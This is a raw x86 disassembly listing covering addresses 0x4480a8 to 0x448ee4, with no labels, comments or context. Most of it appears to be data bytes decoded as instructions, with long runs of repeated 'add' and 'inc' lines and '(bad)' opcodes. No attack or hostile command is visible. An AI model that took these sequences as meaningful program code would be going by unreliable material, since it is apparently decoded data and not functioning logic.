  4480a8:	add    BYTE PTR [eax],al
  4480aa:	inc    DWORD PTR [eax]
  4480ac:	add    BYTE PTR [eax],al
  4480ae:	inc    DWORD PTR [eax]
  4480b0:	add    BYTE PTR [eax],al
  4480b2:	inc    DWORD PTR [eax]
  4480b4:	add    BYTE PTR [eax],al
  4480b6:	inc    DWORD PTR [eax]
  4480b8:	add    BYTE PTR [eax],al
  4480ba:	inc    DWORD PTR [eax]
  4480bc:	add    BYTE PTR [eax],al
  4480be:	inc    DWORD PTR [eax]
  4480c0:	add    BYTE PTR [eax],al
  4480c2:	inc    DWORD PTR [eax]
  4480c4:	add    BYTE PTR [eax],al
  4480c6:	inc    DWORD PTR [eax]
  4480c8:	add    BYTE PTR [eax],al
  4480ca:	inc    DWORD PTR [eax]
  4480cc:	add    BYTE PTR [eax],al
  4480ce:	inc    DWORD PTR [eax]
  4480d0:	add    BYTE PTR [eax],al
  4480d2:	inc    DWORD PTR [eax]
  4480d4:	add    BYTE PTR [eax],al
  4480d6:	inc    DWORD PTR [eax]
  4480d8:	add    BYTE PTR [eax],al
  4480da:	inc    DWORD PTR [eax]
  4480dc:	add    BYTE PTR [eax],al
  4480de:	inc    DWORD PTR [eax]
  4480e0:	add    BYTE PTR [eax],al
  4480e2:	inc    DWORD PTR [eax]
  4480e4:	add    BYTE PTR [eax],al
  4480e6:	inc    DWORD PTR [eax]
  4480e8:	add    BYTE PTR [eax],al
  4480ea:	inc    DWORD PTR [eax]
  4480ec:	add    BYTE PTR [eax],al
  4480ee:	inc    DWORD PTR [eax]
  4480f0:	add    BYTE PTR [eax],al
  4480f2:	inc    DWORD PTR [eax]
  4480f4:	add    BYTE PTR [eax],al
  4480f6:	inc    DWORD PTR [eax]
  4480f8:	add    BYTE PTR [eax],al
  4480fa:	inc    DWORD PTR [eax]
  4480fc:	add    BYTE PTR [eax],al
  4480fe:	inc    DWORD PTR [eax]
  448100:	add    BYTE PTR [eax],al
  448102:	inc    DWORD PTR [eax]
  448104:	add    BYTE PTR [eax],al
  448106:	inc    DWORD PTR [eax]
  448108:	add    BYTE PTR [eax],al
  44810a:	inc    DWORD PTR [eax]
  44810c:	add    BYTE PTR [eax],al
  44810e:	inc    DWORD PTR [eax]
  448110:	add    BYTE PTR [eax],al
  448112:	inc    DWORD PTR [eax]
  448114:	add    BYTE PTR [eax],al
  448116:	inc    DWORD PTR [eax]
  448118:	add    BYTE PTR [eax],al
  44811a:	inc    DWORD PTR [eax]
  44811c:	add    BYTE PTR [eax],al
  44811e:	inc    DWORD PTR [eax]
  448120:	add    BYTE PTR [eax],al
  448122:	inc    DWORD PTR [eax]
  448124:	add    BYTE PTR [eax],al
  448126:	inc    DWORD PTR [eax]
  448128:	add    BYTE PTR [eax],al
  44812a:	call   DWORD PTR [ebx]
  44812c:	adc    DWORD PTR [ecx],edx
  44812e:	sti    
  44812f:	push   ebx
  448130:	dec    edi
  448131:	dec    edi
  448132:	test   BYTE PTR [eax],al
	...
  448140:	add    BYTE PTR [eax],al
  448142:	add    BYTE PTR [ecx-0x3bf45d5e],bh
  448148:	mov    edx,0xc8da1aba
  44814d:	enter  0xda0e,0xc8
  448151:	enter  0xb60e,0xa3
  448155:	mov    ds:0x7f7f910e,eax
  44815a:	push   cs
  44815b:	mov    dh,0xa3
  44815d:	mov    ds:0x4c4c590e,eax
  448162:	sub    BYTE PTR [esi],dh
  448164:	sub    al,0x2c
  448166:	mov    dl,0x11
  448168:	or     ecx,DWORD PTR [ebx]
  44816a:	out    dx,al
  44816b:	add    BYTE PTR [eax],al
  44816d:	add    bh,bh
  44816f:	add    BYTE PTR [eax],al
  448171:	add    bh,bh
  448173:	add    BYTE PTR [eax],al
  448175:	add    bh,bh
  448177:	add    BYTE PTR [eax],al
  448179:	add    bh,bh
  44817b:	add    BYTE PTR [eax],al
  44817d:	add    bh,bh
  44817f:	add    BYTE PTR [eax],al
  448181:	add    bh,bh
  448183:	add    BYTE PTR [eax],al
  448185:	add    bh,bh
  448187:	add    BYTE PTR [eax],al
  448189:	add    bh,bh
  44818b:	add    BYTE PTR [eax],al
  44818d:	add    bh,bh
  44818f:	add    BYTE PTR [eax],al
  448191:	add    bh,bh
  448193:	add    BYTE PTR [eax],al
  448195:	add    bh,bh
  448197:	add    BYTE PTR [eax],al
  448199:	add    bh,bh
  44819b:	add    BYTE PTR [eax],al
  44819d:	add    bh,bh
  44819f:	add    BYTE PTR [eax],al
  4481a1:	add    bh,bh
  4481a3:	add    BYTE PTR [eax],al
  4481a5:	add    bh,bh
  4481a7:	add    BYTE PTR [eax],al
  4481a9:	add    bh,bh
  4481ab:	add    BYTE PTR [eax],al
  4481ad:	add    bh,bh
  4481af:	add    BYTE PTR [eax],al
  4481b1:	add    bh,bh
  4481b3:	add    BYTE PTR [eax],al
  4481b5:	add    bh,bh
  4481b7:	add    BYTE PTR [eax],al
  4481b9:	add    bh,bh
  4481bb:	add    BYTE PTR [eax],al
  4481bd:	add    bh,bh
  4481bf:	add    BYTE PTR [eax],al
  4481c1:	add    bh,bh
  4481c3:	add    BYTE PTR [eax],al
  4481c5:	add    bh,bh
  4481c7:	add    BYTE PTR [eax],al
  4481c9:	add    bh,bh
  4481cb:	add    BYTE PTR [eax],al
  4481cd:	add    bh,bh
  4481cf:	add    BYTE PTR [eax],al
  4481d1:	add    bh,bh
  4481d3:	add    BYTE PTR [eax],al
  4481d5:	add    bh,bh
  4481d7:	add    BYTE PTR [eax],al
  4481d9:	add    bh,bh
  4481db:	add    BYTE PTR [eax],al
  4481dd:	add    bh,bh
  4481df:	add    BYTE PTR [eax],al
  4481e1:	add    bh,bh
  4481e3:	add    BYTE PTR [eax],al
  4481e5:	add    bh,bh
  4481e7:	add    BYTE PTR [eax],al
  4481e9:	add    bh,bh
  4481eb:	add    BYTE PTR [eax],al
  4481ed:	add    bh,bh
  4481ef:	add    BYTE PTR [eax],al
  4481f1:	add    bh,bh
  4481f3:	add    BYTE PTR [eax],al
  4481f5:	add    bh,bh
  4481f7:	add    BYTE PTR [eax],al
  4481f9:	add    bh,bh
  4481fb:	add    BYTE PTR [eax],al
  4481fd:	add    bh,bh
  4481ff:	add    BYTE PTR [eax],al
  448201:	add    bh,bh
  448203:	add    BYTE PTR [eax],al
  448205:	add    bh,bh
  448207:	add    BYTE PTR [eax],al
  448209:	add    bh,bh
  44820b:	add    BYTE PTR [eax],al
  44820d:	add    bh,bh
  44820f:	add    BYTE PTR [eax],al
  448211:	add    bh,bh
  448213:	add    BYTE PTR [eax],al
  448215:	add    bh,bh
  448217:	add    BYTE PTR [eax],al
  448219:	add    bh,bh
  44821b:	add    BYTE PTR [eax],al
  44821d:	add    bh,bh
  44821f:	add    BYTE PTR [eax],al
  448221:	add    bh,bh
  448223:	add    BYTE PTR [eax],al
  448225:	add    bh,bh
  448227:	add    BYTE PTR [eax],al
  448229:	add    bh,bh
  44822b:	add    BYTE PTR [eax],al
  44822d:	add    bh,bh
  44822f:	add    BYTE PTR [eax],al
  448231:	add    bh,bh
  448233:	add    BYTE PTR [eax],al
  448235:	add    bh,bh
  448237:	add    BYTE PTR [eax],al
  448239:	add    bh,bh
  44823b:	add    BYTE PTR [eax],al
  44823d:	add    bh,bh
  44823f:	add    BYTE PTR [eax],al
  448241:	add    bh,bh
  448243:	add    BYTE PTR [eax],al
  448245:	add    bh,bh
  448247:	add    BYTE PTR [eax],al
  448249:	add    bh,bh
  44824b:	add    BYTE PTR [eax],al
  44824d:	add    bh,bh
  44824f:	add    BYTE PTR [eax],al
  448251:	add    bh,bh
  448253:	add    BYTE PTR [eax],al
  448255:	add    bh,bh
  448257:	add    BYTE PTR [eax],al
  448259:	add    bh,bh
  44825b:	add    BYTE PTR [eax],al
  44825d:	add    bh,bh
  44825f:	add    BYTE PTR [eax],al
  448261:	add    bh,bh
  448263:	add    BYTE PTR [eax],al
  448265:	add    bh,bh
  448267:	add    BYTE PTR [eax],al
  448269:	add    bh,bh
  44826b:	add    BYTE PTR [eax],al
  44826d:	add    bh,bh
  44826f:	add    BYTE PTR [eax],al
  448271:	add    bh,bh
  448273:	add    BYTE PTR [eax],al
  448275:	add    bh,bh
  448277:	add    BYTE PTR [eax],al
  448279:	add    bh,bh
  44827b:	add    BYTE PTR [eax],al
  44827d:	add    bh,bh
  44827f:	add    BYTE PTR [eax],al
  448281:	add    bh,bh
  448283:	add    BYTE PTR [eax],al
  448285:	add    bh,bh
  448287:	add    BYTE PTR [eax],al
  448289:	add    bh,bh
  44828b:	add    BYTE PTR [eax],al
  44828d:	add    bh,bh
  44828f:	add    BYTE PTR [eax],al
  448291:	add    bh,bh
  448293:	add    BYTE PTR [eax],al
  448295:	add    bh,bh
  448297:	add    BYTE PTR [eax],al
  448299:	add    bh,bh
  44829b:	add    BYTE PTR [eax],al
  44829d:	add    bh,bh
  44829f:	add    BYTE PTR [eax],al
  4482a1:	add    bh,bh
  4482a3:	add    BYTE PTR [eax],al
  4482a5:	add    bh,bh
  4482a7:	add    BYTE PTR [eax],al
  4482a9:	add    bh,bh
  4482ab:	add    BYTE PTR [eax],al
  4482ad:	add    bh,bh
  4482af:	add    BYTE PTR [eax],al
  4482b1:	add    bh,bh
  4482b3:	add    BYTE PTR [eax],al
  4482b5:	add    bh,bh
  4482b7:	add    BYTE PTR [eax],al
  4482b9:	add    bh,bh
  4482bb:	add    BYTE PTR [eax],al
  4482bd:	add    bh,bh
  4482bf:	add    BYTE PTR [eax],al
  4482c1:	add    bh,bh
  4482c3:	add    BYTE PTR [eax],al
  4482c5:	add    bh,bh
  4482c7:	add    BYTE PTR [eax],al
  4482c9:	add    bh,bh
  4482cb:	add    BYTE PTR [eax],al
  4482cd:	add    bh,bh
  4482cf:	add    BYTE PTR [eax],al
  4482d1:	add    bh,bh
  4482d3:	add    BYTE PTR [eax],al
  4482d5:	add    bh,bh
  4482d7:	add    BYTE PTR [eax],al
  4482d9:	add    bh,bh
  4482db:	add    BYTE PTR [eax],al
  4482dd:	add    bh,bh
  4482df:	add    BYTE PTR [eax],al
  4482e1:	add    bh,bh
  4482e3:	add    BYTE PTR [eax],al
  4482e5:	add    bh,bh
  4482e7:	add    BYTE PTR [eax],al
  4482e9:	add    bh,bh
  4482eb:	add    BYTE PTR [eax],al
  4482ed:	add    bh,bh
  4482ef:	add    BYTE PTR [eax],al
  4482f1:	add    bh,bh
  4482f3:	add    BYTE PTR [eax],al
  4482f5:	add    bh,bh
  4482f7:	add    BYTE PTR [eax],al
  4482f9:	add    bh,bh
  4482fb:	add    BYTE PTR [eax],al
  4482fd:	add    bh,bh
  4482ff:	add    BYTE PTR [eax],al
  448301:	add    bh,bh
  448303:	add    BYTE PTR [eax],al
  448305:	add    bh,bh
  448307:	add    BYTE PTR [eax],al
  448309:	add    bh,bh
  44830b:	add    BYTE PTR [eax],al
  44830d:	add    bh,bh
  44830f:	add    BYTE PTR [eax],al
  448311:	add    bh,bh
  448313:	add    BYTE PTR [eax],al
  448315:	add    bh,bh
  448317:	add    BYTE PTR [eax],al
  448319:	add    bh,bh
  44831b:	add    BYTE PTR [eax],al
  44831d:	add    bh,bh
  44831f:	pop    es
  448320:	push   es
  448321:	push   es
  448322:	(bad)  
  448323:	es and al,0x23
  448326:	out    0x3f,al
  448328:	cmp    edi,DWORD PTR [ebx]
  44832a:	lea    ecx,[ebx-0x49e97481]
  448330:	mov    ds:0x91a30ea3,eax
  448335:	mov    ds:0xa391a30e,eax
  44833a:	push   cs
  44833b:	enter  0xb6b6,0xe
  44833f:	enter  0xb6b6,0xe
  448343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448344:	mov    DWORD PTR [edx+ebx*1+0x0],ebx
	...
  448357:	js     0x448359
	...
  448365:	add    BYTE PTR [esi],bl
  448367:	jo     0x448369
	...
  448375:	add    BYTE PTR [esi],cl
  448377:	inc    eax
	...
  448384:	add    BYTE PTR [eax],al
  448386:	push   es
  448387:	inc    eax
	...
  448394:	add    BYTE PTR [eax],al
  448396:	add    al,BYTE PTR [eax]
	...
  448b04:	add    BYTE PTR [eax],al
  448b06:	add    al,BYTE PTR [eax+0x0]
	...
  448b15:	add    BYTE PTR [esi],al
  448b17:	pusha  
	...
  448b24:	add    BYTE PTR [eax],al
  448b26:	push   es
  448b27:	jo     0x448b29
	...
  448b35:	add    BYTE PTR [esi],bl
	...
  448b47:	sub    BYTE PTR [eax],al
  448b49:	add    BYTE PTR [eax],al
  448b4b:	inc    eax
  448b4c:	add    BYTE PTR [eax],al
  448b4e:	add    BYTE PTR [eax+0x1000000],al
  448b54:	add    BYTE PTR [eax],ah
  448b56:	add    BYTE PTR [eax],al
  448b58:	add    BYTE PTR [eax],al
  448b5a:	add    BYTE PTR [eax],al
  448b5c:	inc    edx
	...
  448b6d:	add    BYTE PTR [eax],al
  448b6f:	cdq    
  448b70:	mov    BYTE PTR [eax+0x51515b1e],cl
  448b76:	sbb    al,0x1b
  448b78:	sbb    BYTE PTR [ebx],ah
  448b7a:	mov    bl,0x5
  448b7c:	add    al,0x24
  448b7e:	sti    
  448b7f:	add    BYTE PTR [eax],al
  448b81:	inc    DWORD PTR cs:[eax]
  448b84:	add    BYTE PTR ds:0x2f0000ff,ch
  448b8a:	inc    DWORD PTR [eax]
  448b8c:	add    BYTE PTR [edx],dh
  448b8e:	inc    DWORD PTR [eax]
  448b90:	add    BYTE PTR [edi+edi*8],ch
  448b93:	add    BYTE PTR [eax],al
  448b95:	inc    DWORD PTR cs:[eax]
  448b98:	add    BYTE PTR ds:0x2c0000ff,ch
  448b9e:	inc    DWORD PTR [eax]
  448ba0:	add    BYTE PTR [eax],dh
  448ba2:	inc    DWORD PTR [eax]
  448ba4:	add    BYTE PTR [edx],dh
  448ba6:	inc    DWORD PTR [eax]
  448ba8:	add    BYTE PTR [edi+edi*8],bh
  448bab:	add    BYTE PTR [eax],al
  448bad:	xor    bh,bh
  448baf:	add    BYTE PTR [eax],al
  448bb1:	sub    bh,bh
  448bb3:	add    BYTE PTR [eax],al
  448bb5:	cmp    eax,0x370000ff
  448bba:	inc    DWORD PTR [eax]
  448bbc:	add    BYTE PTR ds:0x390000ff,dh
  448bc2:	inc    DWORD PTR [eax]
  448bc4:	add    BYTE PTR [eax],bh
  448bc6:	inc    DWORD PTR [eax]
  448bc8:	add    BYTE PTR [eax],bh
  448bca:	inc    DWORD PTR [eax]
  448bcc:	add    BYTE PTR [edi],dh
  448bce:	inc    DWORD PTR [eax]
  448bd0:	add    BYTE PTR [edi+edi*8],bh
  448bd3:	add    BYTE PTR [eax],al
  448bd5:	cmp    edi,edi
  448bd7:	add    BYTE PTR [eax],al
  448bd9:	aas    
  448bda:	inc    DWORD PTR [eax]
  448bdc:	add    BYTE PTR [eax-0x1],al
  448bdf:	add    BYTE PTR [eax],al
  448be1:	inc    esp
  448be2:	inc    DWORD PTR [eax]
  448be4:	add    BYTE PTR [ebp-0x1],al
  448be7:	add    BYTE PTR [eax],al
  448be9:	inc    ebp
  448bea:	inc    DWORD PTR [eax]
  448bec:	add    BYTE PTR [edi],bh
  448bee:	inc    DWORD PTR [eax]
  448bf0:	add    BYTE PTR [edi+edi*8+0x0],al
  448bf4:	add    BYTE PTR [edi-0x1],al
  448bf7:	add    BYTE PTR [eax],al
  448bf9:	dec    eax
  448bfa:	inc    DWORD PTR [eax]
  448bfc:	add    BYTE PTR [edi-0x1],al
  448bff:	add    BYTE PTR [eax],al
  448c01:	push   edx
  448c02:	inc    DWORD PTR [eax]
  448c04:	add    BYTE PTR [esi],bh
  448c06:	inc    DWORD PTR [eax]
  448c08:	add    BYTE PTR [edi+edi*8],bh
  448c0b:	add    BYTE PTR [eax],al
  448c0d:	cmp    bh,bh
  448c0f:	add    BYTE PTR [eax],al
  448c11:	inc    eax
  448c12:	inc    DWORD PTR [eax]
  448c14:	add    BYTE PTR [esi],bh
  448c16:	inc    DWORD PTR [eax]
  448c18:	add    BYTE PTR ds:0x400000ff,bh
  448c1e:	inc    DWORD PTR [eax]
  448c20:	add    BYTE PTR [edx-0x1],al
  448c23:	add    BYTE PTR [eax],al
  448c25:	inc    DWORD PTR ss:[eax]
  448c28:	add    BYTE PTR [ecx],bh
  448c2a:	inc    DWORD PTR [eax]
  448c2c:	add    BYTE PTR [edi],dh
  448c2e:	inc    DWORD PTR [eax]
  448c30:	add    BYTE PTR [eax],bh
  448c32:	inc    DWORD PTR [eax]
  448c34:	add    BYTE PTR [ecx],dh
  448c36:	inc    DWORD PTR [eax]
  448c38:	add    BYTE PTR [edx],dh
  448c3a:	inc    DWORD PTR [eax]
  448c3c:	add    BYTE PTR ds:0x320000ff,dh
  448c42:	inc    DWORD PTR [eax]
  448c44:	add    BYTE PTR [edi],dh
  448c46:	inc    DWORD PTR [eax]
  448c48:	add    BYTE PTR [ebx],bh
  448c4a:	inc    DWORD PTR [eax]
  448c4c:	add    BYTE PTR [ebx],bh
  448c4e:	inc    DWORD PTR [eax]
  448c50:	add    BYTE PTR [esi],bh
  448c52:	inc    DWORD PTR [eax]
  448c54:	add    BYTE PTR [ebx],bh
  448c56:	inc    DWORD PTR [eax]
  448c58:	add    BYTE PTR [ebx],bh
  448c5a:	inc    DWORD PTR [edx]
  448c5c:	add    DWORD PTR [edi],esi
  448c5e:	call   FWORD PTR [edi]
  448c60:	sbb    eax,0x3f43da39
  448c65:	inc    ebx
  448c66:	inc    eax
  448c67:	ret    
  448c68:	mov    ah,0xb4
  448c6a:	adc    DWORD PTR [edx+0x311ea1a1],esi
  448c70:	sub    ah,BYTE PTR [ebx]
  448c72:	and    al,0xa
  448c74:	or     bl,BYTE PTR [esi]
  448c76:	repz add BYTE PTR [eax],al
  448c79:	inc    DWORD PTR es:[eax]
  448c7c:	add    BYTE PTR [esi],ah
  448c7e:	inc    DWORD PTR [eax]
  448c80:	add    BYTE PTR [ecx],ch
  448c82:	inc    DWORD PTR [eax]
  448c84:	add    BYTE PTR [esi],ah
  448c86:	inc    DWORD PTR [eax]
  448c88:	add    BYTE PTR [ebx],ch
  448c8a:	inc    DWORD PTR [eax]
  448c8c:	add    BYTE PTR [esi],ch
  448c8e:	inc    DWORD PTR [eax]
  448c90:	add    BYTE PTR ds:0x380000ff,dh
  448c96:	inc    DWORD PTR [eax]
  448c98:	add    BYTE PTR [eax],bh
  448c9a:	inc    DWORD PTR [eax]
  448c9c:	add    BYTE PTR [esi],dh
  448c9e:	inc    DWORD PTR [eax]
  448ca0:	add    BYTE PTR ds:0x370000ff,bh
  448ca6:	inc    DWORD PTR [eax]
  448ca8:	add    BYTE PTR [edx],bh
  448caa:	inc    DWORD PTR [eax]
  448cac:	add    BYTE PTR [edx],bh
  448cae:	inc    DWORD PTR [eax]
  448cb0:	add    BYTE PTR [esi],dh
  448cb2:	inc    DWORD PTR [eax]
  448cb4:	add    BYTE PTR [eax],bh
  448cb6:	inc    DWORD PTR [eax]
  448cb8:	add    BYTE PTR [edi],bh
  448cba:	inc    DWORD PTR [eax]
  448cbc:	add    BYTE PTR [eax-0x1],al
  448cbf:	add    BYTE PTR [eax],al
  448cc1:	inc    DWORD PTR ss:[eax]
  448cc4:	add    BYTE PTR [ebx-0x1],al
  448cc7:	add    BYTE PTR [eax],al
  448cc9:	dec    esp
  448cca:	inc    DWORD PTR [eax]
  448ccc:	add    BYTE PTR [ebp-0x1],al
  448ccf:	add    BYTE PTR [eax],al
  448cd1:	inc    eax
  448cd2:	inc    DWORD PTR [eax]
  448cd4:	add    BYTE PTR ds:0x440000ff,bh
  448cda:	inc    DWORD PTR [eax]
  448cdc:	add    BYTE PTR [edx],bh
  448cde:	inc    DWORD PTR [eax]
  448ce0:	add    BYTE PTR [ecx],bh
  448ce2:	inc    DWORD PTR [eax]
  448ce4:	add    BYTE PTR [ebp-0x1],al
  448ce7:	add    BYTE PTR [eax],al
  448ce9:	inc    esi
  448cea:	inc    DWORD PTR [eax]
  448cec:	add    BYTE PTR [esi],bh
  448cee:	inc    DWORD PTR [eax]
  448cf0:	add    BYTE PTR [edi],bh
  448cf2:	inc    DWORD PTR [eax]
  448cf4:	add    BYTE PTR [esi-0x1],al
  448cf7:	add    BYTE PTR [eax],al
  448cf9:	cmp    bh,bh
  448cfb:	add    BYTE PTR [eax],al
  448cfd:	inc    ecx
  448cfe:	inc    DWORD PTR [eax]
  448d00:	add    BYTE PTR [esi-0x1],dl
  448d03:	add    BYTE PTR [eax],al
  448d05:	push   edi
  448d06:	inc    DWORD PTR [eax]
  448d08:	add    BYTE PTR [edi+edi*8+0x0],cl
  448d0c:	add    BYTE PTR ds:0x440000ff,bh
  448d12:	inc    DWORD PTR [eax]
  448d14:	add    BYTE PTR [edx-0x1],al
  448d17:	add    BYTE PTR [eax],al
  448d19:	inc    DWORD PTR ds:[eax]
  448d1c:	add    BYTE PTR [ebx-0x1],al
  448d1f:	add    BYTE PTR [eax],al
  448d21:	dec    edx
  448d22:	inc    DWORD PTR [eax]
  448d24:	add    BYTE PTR [edx-0x1],al
  448d27:	add    BYTE PTR [eax],al
  448d29:	cmp    edi,edi
  448d2b:	add    BYTE PTR [eax],al
  448d2d:	cmp    al,0xff
  448d2f:	add    BYTE PTR [eax],al
  448d31:	cmp    bh,bh
  448d33:	add    BYTE PTR [eax],al
  448d35:	xor    eax,0x340000ff
  448d3a:	inc    DWORD PTR [eax]
  448d3c:	add    BYTE PTR [ebx],dh
  448d3e:	inc    DWORD PTR [eax]
  448d40:	add    BYTE PTR [edi],dh
  448d42:	inc    DWORD PTR [eax]
  448d44:	add    BYTE PTR [esi],bh
  448d46:	inc    DWORD PTR [eax]
  448d48:	add    BYTE PTR [edi],dh
  448d4a:	inc    DWORD PTR [eax]
  448d4c:	add    BYTE PTR ds:0x3c0000ff,bh
  448d52:	inc    DWORD PTR [eax]
  448d54:	add    BYTE PTR [ecx],bh
  448d56:	inc    DWORD PTR [eax]
  448d58:	add    BYTE PTR [eax],bh
  448d5a:	inc    DWORD PTR [eax]
  448d5c:	add    BYTE PTR [edi],bh
  448d5e:	inc    DWORD PTR [eax]
  448d60:	add    BYTE PTR [ebx],bh
  448d62:	inc    DWORD PTR [esi]
  448d64:	add    eax,0x2727ff34
  448d69:	xor    bl,BYTE PTR [ebx-0x56]
  448d6c:	xchg   esp,eax
  448d6d:	xchg   esp,eax
  448d6e:	or     al,0xb
  448d70:	or     ebx,DWORD PTR [ecx]
  448d72:	fld    QWORD PTR [eax]
  448d74:	add    BYTE PTR [eax],ah
  448d76:	inc    DWORD PTR [eax]
  448d78:	add    BYTE PTR [ebx],ch
  448d7a:	inc    DWORD PTR [eax]
  448d7c:	add    BYTE PTR [ebx],ch
  448d7e:	inc    DWORD PTR [eax]
  448d80:	add    BYTE PTR [esi],ah
  448d82:	inc    DWORD PTR [eax]
  448d84:	add    BYTE PTR [ebx],ah
  448d86:	inc    DWORD PTR [eax]
  448d88:	add    BYTE PTR [eax],ch
  448d8a:	inc    DWORD PTR [eax]
  448d8c:	add    BYTE PTR [eax],ch
  448d8e:	inc    DWORD PTR [eax]
  448d90:	add    BYTE PTR [ebx],ch
  448d92:	inc    DWORD PTR [eax]
  448d94:	add    BYTE PTR [edi],ch
  448d96:	inc    DWORD PTR [eax]
  448d98:	add    BYTE PTR [ebx],dh
  448d9a:	inc    DWORD PTR [eax]
  448d9c:	add    BYTE PTR [edi],dh
  448d9e:	inc    DWORD PTR [eax]
  448da0:	add    BYTE PTR [eax-0x1],al
  448da3:	add    BYTE PTR [eax],al
  448da5:	inc    esp
  448da6:	inc    DWORD PTR [eax]
  448da8:	add    BYTE PTR [edx],bh
  448daa:	inc    DWORD PTR [eax]
  448dac:	add    BYTE PTR [eax],bh
  448dae:	inc    DWORD PTR [eax]
  448db0:	add    BYTE PTR [edx],bh
  448db2:	inc    DWORD PTR [eax]
  448db4:	add    BYTE PTR [edi+edi*8],bh
  448db7:	add    BYTE PTR [eax],al
  448db9:	cmp    bh,bh
  448dbb:	add    BYTE PTR [eax],al
  448dbd:	inc    edx
  448dbe:	inc    DWORD PTR [eax]
  448dc0:	add    BYTE PTR [eax-0x1],al
  448dc3:	add    BYTE PTR [eax],al
  448dc5:	inc    ebx
  448dc6:	inc    DWORD PTR [eax]
  448dc8:	add    BYTE PTR [eax-0x1],al
  448dcb:	add    BYTE PTR [eax],al
  448dcd:	inc    ebp
  448dce:	inc    DWORD PTR [eax]
  448dd0:	add    BYTE PTR [ecx],bh
  448dd2:	inc    DWORD PTR [eax]
  448dd4:	add    BYTE PTR [ebx],bh
  448dd6:	inc    DWORD PTR [eax]
  448dd8:	add    BYTE PTR [edx-0x1],al
  448ddb:	add    BYTE PTR [eax],al
  448ddd:	inc    ebp
  448dde:	inc    DWORD PTR [eax]
  448de0:	add    BYTE PTR [esi-0x1],al
  448de3:	add    BYTE PTR [eax],al
  448de5:	inc    eax
  448de6:	inc    DWORD PTR [eax]
  448de8:	add    BYTE PTR [edi+edi*8],bh
  448deb:	add    BYTE PTR [eax],al
  448ded:	dec    ecx
  448dee:	inc    DWORD PTR [eax]
  448df0:	add    BYTE PTR [edi-0x1],al
  448df3:	add    BYTE PTR [eax],al
  448df5:	inc    ebx
  448df6:	inc    DWORD PTR [eax]
  448df8:	add    BYTE PTR [esi],bh
  448dfa:	inc    DWORD PTR [eax]
  448dfc:	add    BYTE PTR ds:0x470000ff,bh
  448e02:	inc    DWORD PTR [eax]
  448e04:	add    BYTE PTR [ecx-0x1],dl
  448e07:	add    BYTE PTR [eax],al
  448e09:	pop    edx
  448e0a:	inc    DWORD PTR [eax]
  448e0c:	add    BYTE PTR [ebp-0x1],dl
  448e0f:	add    BYTE PTR [eax],al
  448e11:	inc    ebp
  448e12:	inc    DWORD PTR [eax]
  448e14:	add    BYTE PTR [eax-0x1],al
  448e17:	add    BYTE PTR [eax],al
  448e19:	cmp    edi,edi
  448e1b:	add    BYTE PTR [eax],al
  448e1d:	aaa    
  448e1e:	inc    DWORD PTR [eax]
  448e20:	add    BYTE PTR [edx-0x1],al
  448e23:	add    BYTE PTR [eax],al
  448e25:	aas    
  448e26:	inc    DWORD PTR [eax]
  448e28:	add    BYTE PTR ds:0x350000ff,dh
  448e2e:	inc    DWORD PTR [eax]
  448e30:	add    BYTE PTR ds:0x3d0000ff,dh
  448e36:	inc    DWORD PTR [eax]
  448e38:	add    BYTE PTR [edx],bh
  448e3a:	inc    DWORD PTR [eax]
  448e3c:	add    BYTE PTR [ecx],bh
  448e3e:	inc    DWORD PTR [eax]
  448e40:	add    BYTE PTR [edx],bh
  448e42:	inc    DWORD PTR [eax]
  448e44:	add    BYTE PTR [edi+edi*8],bh
  448e47:	add    BYTE PTR [eax],al
  448e49:	xor    eax,0x400000ff
  448e4e:	inc    DWORD PTR [eax]
  448e50:	add    BYTE PTR [edi],bh
  448e52:	inc    DWORD PTR [eax]
  448e54:	add    BYTE PTR [ecx],bh
  448e56:	inc    DWORD PTR [eax]
  448e58:	add    BYTE PTR [ecx],bh
  448e5a:	inc    DWORD PTR [eax]
  448e5c:	add    BYTE PTR [ebx],bh
  448e5e:	inc    DWORD PTR [eax]
  448e60:	add    BYTE PTR [esi],bh
  448e62:	inc    DWORD PTR [eax]
  448e64:	add    BYTE PTR [esi],dh
  448e66:	dec    DWORD PTR [edx]
  448e68:	or     DWORD PTR [edi],esi
  448e6a:	(bad)  
  448e6b:	pop    esi
  448e6c:	pop    eax
  448e6d:	pop    esi
  448e6e:	sub    eax,DWORD PTR [eax]
  448e70:	add    BYTE PTR [edi+edi*8],bl
  448e73:	add    BYTE PTR [eax],al
  448e75:	and    bh,bh
  448e77:	add    BYTE PTR [eax],al
  448e79:	inc    DWORD PTR es:[eax]
  448e7c:	add    BYTE PTR [ecx],ch
  448e7e:	inc    DWORD PTR [eax]
  448e80:	add    BYTE PTR [ebx],ch
  448e82:	inc    DWORD PTR [eax]
  448e84:	add    BYTE PTR [esi],ah
  448e86:	inc    DWORD PTR [eax]
  448e88:	add    BYTE PTR [edi],ah
  448e8a:	inc    DWORD PTR [eax]
  448e8c:	add    BYTE PTR [edi],ah
  448e8e:	inc    DWORD PTR [eax]
  448e90:	add    BYTE PTR [edx],ch
  448e92:	inc    DWORD PTR [eax]
  448e94:	add    BYTE PTR ds:0x310000ff,ch
  448e9a:	inc    DWORD PTR [eax]
  448e9c:	add    BYTE PTR [eax],dh
  448e9e:	inc    DWORD PTR [eax]
  448ea0:	add    BYTE PTR [edi+edi*8+0x0],al
  448ea4:	add    BYTE PTR [edx-0x1],al
  448ea7:	add    BYTE PTR [eax],al
  448ea9:	cmp    edi,edi
  448eab:	add    BYTE PTR [eax],al
  448ead:	aaa    
  448eae:	inc    DWORD PTR [eax]
  448eb0:	add    BYTE PTR ds:0x3e0000ff,bh
  448eb6:	inc    DWORD PTR [eax]
  448eb8:	add    BYTE PTR [ebx-0x1],al
  448ebb:	add    BYTE PTR [eax],al
  448ebd:	inc    ebx
  448ebe:	inc    DWORD PTR [eax]
  448ec0:	add    BYTE PTR [edi-0x1],al
  448ec3:	add    BYTE PTR [eax],al
  448ec5:	dec    ebp
  448ec6:	inc    DWORD PTR [eax]
  448ec8:	add    BYTE PTR [esi-0x1],al
  448ecb:	add    BYTE PTR [eax],al
  448ecd:	cmp    al,0xff
  448ecf:	add    BYTE PTR [eax],al
  448ed1:	cmp    bh,bh
  448ed3:	add    BYTE PTR [eax],al
  448ed5:	aas    
  448ed6:	inc    DWORD PTR [eax]
  448ed8:	add    BYTE PTR [ecx-0x1],al
  448edb:	add    BYTE PTR [eax],al
  448edd:	cmp    bh,bh
  448edf:	add    BYTE PTR [eax],al
  448ee1:	inc    esi
  448ee2:	inc    DWORD PTR [eax]
  448ee4:	add    BYTE PTR [eax-0x1],cl
